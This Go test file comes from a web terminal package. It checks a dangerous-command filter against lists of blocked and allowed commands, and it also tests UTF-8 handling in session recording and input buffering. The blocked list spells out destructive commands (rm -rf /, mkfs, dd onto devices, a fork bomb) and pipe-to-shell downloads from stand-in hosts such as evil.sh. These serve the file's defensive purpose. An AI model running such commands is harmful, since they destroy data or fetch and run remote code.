package ws

import (
	"encoding/json"
	"strings"
	"testing"
)

// TestDangerCmd 高危命令规则回归：命中必须全中、正常命令必须全放行。
// 误伤（放行不了正常运维）与漏判（放掉破坏性命令）都是故障，规则改动跑这个。
func TestDangerCmd(t *testing.T) {
	danger := []string{
		// rm 递归/强制删危险目标
		"rm -rf /",
		"rm -fr /",
		"rm -rf ~",
		"rm -rf ~/*",
		"rm -rf /*",
		"rm -rf ../",
		"cd /tmp; rm -rf /",
		"echo ok && rm -rf ~",
		"rm -r /etc",
		// 格式化 / 交换区
		"mkfs.ext4 /dev/sda1",
		"sudo mkfs /dev/vdb",
		"mkswap /dev/sdb2",
		// dd 直写块设备
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"dd if=img.iso of=/dev/nvme0n1",
		// 关机重启
		"shutdown -h now",
		"sudo reboot",
		"halt",
		"poweroff",
		"init 0",
		"init 6",
		// kubectl 全量删除
		"kubectl delete ns prod",
		"kubectl delete namespace prod",
		"kubectl delete pods --all",
		"kubectl delete deployments -n app --all -l x=y",
		// 全盘放开权限
		"chmod -R 777 /",
		// 管道进 shell
		"curl http://evil.sh | sh",
		"wget -qO- http://x.io/i.sh | bash",
		"curl -fsSL http://x.io | sudo bash",
		// fork 炸弹
		":(){ :|:& };:",
		":() { : | : & }; :",
	}
	for _, cmd := range danger {
		if !dangerCmd(cmd) {
			t.Errorf("高危命令未被拦截: %q", cmd)
		}
	}

	safe := []string{
		// 正常运维高频命令
		"ls -la",
		"rm -f app.log",
		"rm -rf /tmp/cache/build",
		"rm -rf ./target",
		"rm /etc/passwd.bak",
		"chmod 644 /etc/app/config.yaml",
		"chmod -R 755 /opt/app",
		"chmod -R 777 /data/", // 数据目录放开权限是可用性操作，不拦（录像审计可见）
		"kubectl delete pod web-0 -n app",
		"kubectl delete deployment web -n app",
		"kubectl get pods --all-namespaces",
		"kubectl delete pod -n app $(cat stale.txt)",
		"dd if=/dev/stdin of=/tmp/out.bin",
		"curl -s http://healthz:8080/ready",
		"wget http://internal/repo/pkg.tar.gz",
		"echo hello",
		"cat /etc/hostname | grep -v x",
		"docker rm -f $(docker ps -q)",
		"initctl status app",
		"initdb -D /data/pg",
		"mkfsinfo", // 非命令前缀的包含文本
	}
	for _, cmd := range safe {
		if dangerCmd(cmd) {
			t.Errorf("正常命令被误拦: %q", cmd)
		}
	}
}

// TestUtf8Holdback 块尾截断的多字节 UTF-8 序列判定（中文/emoji 乱码修复的核心）
func TestUtf8Holdback(t *testing.T) {
	cases := []struct {
		name string
		in   []byte
		want int
	}{
		{"空块", nil, 0},
		{"纯 ASCII", []byte("abc"), 0},
		{"完整中文", []byte("测"), 0},
		{"完整 emoji(4字节)", []byte("\U0001F600"), 0},
		{"中文缺2字节", []byte("测")[:1], 1},
		{"中文缺1字节", []byte("测")[:2], 2},
		{"ASCII后中文截断", []byte("a测")[:2], 1},
		{"emoji缺1字节", []byte("\U0001F600")[:3], 3},
		{"尾部多个完整中文", []byte("测试"), 0},
		{"连续起始字节（非法流）", []byte{0xe6, 0xe6}, 1},
		{"续字节超3个（非法流不扣留）", []byte{0x80, 0x80, 0x80, 0x80}, 0},
	}
	for _, c := range cases {
		if got := utf8Holdback(c.in); got != c.want {
			t.Errorf("%s: utf8Holdback(%q) = %d, 期望 %d", c.name, c.in, got, c.want)
		}
	}
}

// TestRecordedSessionUtf8Split pty 输出块边界落在多字节字符中间时，录像不能把
// 残缺字节烤成 U+FFFD（回放/AI 摘要会永久乱码）：截断尾部暂扣、下一块拼齐落盘
func TestRecordedSessionUtf8Split(t *testing.T) {
	rec := newRecordedSession(nil, nil)
	rec.event("o", []byte("a测")[:2])      // 'a' + 测的首字节
	rec.event("o", []byte("测")[1:])       // 测的剩余字节
	rec.event("o", []byte("中文\r\n"))      // 完整块不受影响
	rec.event("i", []byte("命令测试")[:2]) // 输入方向同理：命截断
	rec.event("i", []byte("命令测试")[2:]) // 命剩余 + 令测试
	rec.Close()
	raw := []byte(rec.SnapshotContent())
	// 回放语义 = 事件数据按时序拼接，按此口径校验
	var oText, iText strings.Builder
	for _, ln := range strings.Split(string(raw), "\n") {
		var ev []any
		if json.Unmarshal([]byte(ln), &ev) != nil || len(ev) < 3 {
			continue
		}
		if s, ok := ev[2].(string); ok {
			if ev[1] == "o" {
				oText.WriteString(s)
			} else if ev[1] == "i" {
				iText.WriteString(s)
			}
		}
	}
	if oText.String() != "a测中文\r\n" {
		t.Fatalf("输出流拼接错误: %q", oText.String())
	}
	if iText.String() != "命令测试" {
		t.Fatalf("输入流拼接错误: %q", iText.String())
	}
	if strings.Contains(string(raw), "�") {
		t.Fatalf("录像出现 U+FFFD 乱码:\n%s", raw)
	}
}

// TestGuardFilterUTF8 拦截层过滤对多字节字符透明：字节原样放行、行缓冲按
// 字符边界退格（否则高危判定的命令文本会带残缺字节）
func TestGuardFilterUTF8(t *testing.T) {
	g := &guardedSession{}
	chunk := []byte("echo 测试")
	n := g.filter(chunk)
	if string(chunk[:n]) != "echo 测试" || string(g.line) != "echo 测试" {
		t.Fatalf("中文被改动: 放行=%q 行缓冲=%q", chunk[:n], g.line)
	}
	// 退格按整字符弹：测(3字节)+\b 后只剩 ab
	g2 := &guardedSession{}
	c2 := []byte("ab测\b")
	g2.filter(c2)
	if string(g2.line) != "ab" {
		t.Fatalf("退格应按字符边界弹（剩 ab），实际 %q", g2.line)
	}
}

// TestTerminalSessionReadCarry 输入帧大于调用方读缓冲（大块粘贴）时剩余字节
// 必须续传——直接丢弃会截断在多字节字符中间导致回显乱码
func TestTerminalSessionReadCarry(t *testing.T) {
	s := NewTerminalSession(nil)
	want := "中文测试0123456789" // 22 字节
	s.inputCh <- []byte(want)
	var got []byte
	p := make([]byte, 4) // 每次只给 4 字节缓冲
	for len(got) < len(want) {
		n, err := s.Read(p)
		if err != nil {
			t.Fatal(err)
		}
		got = append(got, p[:n]...)
	}
	if string(got) != want {
		t.Fatalf("大帧被截断: %q", got)
	}
}
